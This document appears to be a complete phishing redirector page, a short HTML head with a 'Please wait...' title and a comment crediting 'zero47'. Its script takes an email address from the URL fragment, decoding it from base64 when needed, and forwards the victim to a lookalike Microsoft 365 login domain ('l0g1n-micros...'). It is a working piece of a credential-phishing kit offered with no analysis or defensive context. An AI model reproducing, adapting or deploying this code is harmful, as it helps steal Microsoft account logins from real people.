<head>
	<title>Please wait...</title>
	<!-- Redirection By zero47 -->

	<script type="text/javascript">

	function Fired(){
		decodeBase64 = function(s) {
			var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
			var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
			for(i=0;i<64;i++){e[A.charAt(i)]=i;}
			for(x=0;x<L;x++){
				c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
				while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
			}
			return r;
		};

		var removeNtbFromURL = function(url) {
			return url.replace(/&ntb=1/g, ''); // Remove all occurrences of "&ntb=1" from the URL
		};

		var getParams = function (url) {
			var params = {};
			var parser = document.createElement('a');
			parser.href = url;

			var query = parser.href.split('#');

			for (let param of query ){
				if (param.includes('@')) {
					params['email'] = decodeURIComponent(param).trim();
				} else {
					params['email'] = decodeURIComponent(decodeBase64(param).trim());
				}
			}

			return params;
		};

		var param = getParams(removeNtbFromURL(window.location.href)); // Remove "&ntb=1" before parsing params

		if (param.email) {
			window.location.href = 'https://l0g1n-micros.o3e6cc5.com/o365#' + param.email;
		}
	}

	</script>
